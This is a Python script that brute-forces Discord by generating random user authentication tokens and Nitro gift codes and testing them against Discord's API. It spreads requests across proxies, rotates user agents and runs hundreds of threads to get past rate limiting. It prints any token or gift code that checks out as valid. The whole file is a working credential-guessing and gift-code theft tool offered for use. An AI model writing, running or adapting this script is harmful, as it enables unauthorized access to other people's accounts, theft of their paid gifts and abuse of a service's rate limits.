import random
import string
import requests
import threading

char = string.ascii_letters + string.digits + "-" + "_"
tokenAPI = "https://discordapp.com/api/v9/users/@me/library"
nitroAPI = 'https://discordapp.com/api/v9/entitlements/gift-codes/'

userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36",
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36']

h = {}


def checkToken(token):
    Header = {
        'Content-Type': 'application/json',
        'authorization': token,
        'User-Agent': random.choice(userAgents)
    }
    if use_proxies and len(proxies) > 0 and proxy_type and location:
        reqToken = None
        for prox in proxies:
            try:
                reqToken = requests.get(proxies=prox, url=tokenAPI, headers=Header)
            except Exception as e:
                print('Token: Error - ', e)
                continue
        if not reqToken:
            reqToken = requests.get(url=tokenAPI, headers=Header)
    else:
        reqToken = requests.get(url=tokenAPI, headers=Header)
    if reqToken.status_code == 404:
        print(f"Token: API is invalid: {tokenAPI}")
    elif reqToken.status_code == 429:
        print("Token: Rate Limited")
    elif reqToken.status_code == 200:
        print(f"Token: Valid - {token}")
    else:
        print(f"Token: Invalid - {token}")


def generateToken():
    firstPart = "".join((random.choice(char)) for i in range(24))
    secondPart = "".join((random.choice(char)) for i in range(6))
    thirdPart = "".join((random.choice(char)) for i in range(27))
    token = firstPart + "." + secondPart + "." + thirdPart
    authToken = "mfa." + token
    checkToken(token)
    checkToken(authToken)


def generateNitro():
    h["User-Agent"] = random.choice(userAgents)
    nitro = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(19))
    if use_proxies and len(proxies) > 0 and proxy_type and location:
        urlNitro = None
        for prox in proxies:
            try:
                urlNitro = requests.get(proxies=prox, url=nitroAPI + nitro, timeout=20, headers=h)
            except Exception as e:
                print('Nitro: Error - ', e)
                continue
        if not urlNitro:
            urlNitro = requests.get(url=nitroAPI + nitro, timeout=20, headers=h)
    else:
        urlNitro = requests.get(url=nitroAPI + nitro, timeout=20, headers=h)
    data = urlNitro.json()
    if urlNitro.status_code == 200:
        print(f'Nitro: Valid nitro - https://discord.gift/{nitro} - Request code 200')
        print(data)
    elif urlNitro.status_code == 429:
        print("Nitro: Rate Limited - Error Code 429")
    else:
        print(f"Nitro: Invalid - https://discord.gift/{nitro} - Error Code: {urlNitro.status_code}")


use_proxies = input('[?] Do you want to use proxies? (Y)es / (N)o >> ').lower()
while True:
    amount_threads = input('[?] How many threads? 50: Ok | 100: a lot | 200: may crash your pc >> ')
    if amount_threads != "" and amount_threads.isdigit():
        amount_threads = int(amount_threads)
        break
use_proxies = True if use_proxies == "y" or use_proxies == 'yes' else False
proxies = []
proxy_type = None
location = None
if use_proxies:
    while True:
        file_name = input("[?] Proxies file location | .txt format expected! |\n"
                          "Example of the proxies in the file:\n"
                          " localhost:8080\n"
                          " username:password@123.156.89:443\n"
                          " 141.51.133:80\n"
                          "You should also specify the type of the proxy by default it is HTTP\n"
                          "Example:\n"
                          " /my_proxies/proxies.txt http\n"
                          "->> ")
        if file_name != '':
            if ' ' in file_name:
                try:
                    location, proxy_type = file_name.split(' ')
                    proxy_type = proxy_type.lower()
                except Exception:
                    continue
            else:
                proxy_type = 'http'
                location = file_name
            proxies = [{'http': proxy_type + '://' + line.replace('\n', ''), 'https': proxy_type + '://' + line.replace('\n', '')} for line in open(location, 'rt')]
            break


while True:
    try:
        for th in range(amount_threads):
            threading.Thread(target=generateNitro, daemon=True).start()
            #print()
            threading.Thread(target=generateToken, daemon=True).start()
    except KeyboardInterrupt:
            print("CTRL + C - Detected")
            break
